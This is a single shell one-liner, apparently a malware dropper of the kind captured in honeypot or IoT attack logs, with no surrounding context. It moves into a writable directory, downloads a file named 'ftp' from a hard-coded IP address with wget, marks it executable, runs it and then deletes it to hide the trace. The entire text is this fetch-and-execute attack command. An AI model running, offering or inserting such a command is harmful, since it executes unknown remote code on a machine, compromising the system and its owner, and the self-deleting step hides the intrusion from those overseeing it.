cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.178.96.3/ftp; chmod +x ftp; ./ftp; rm -rf ftp
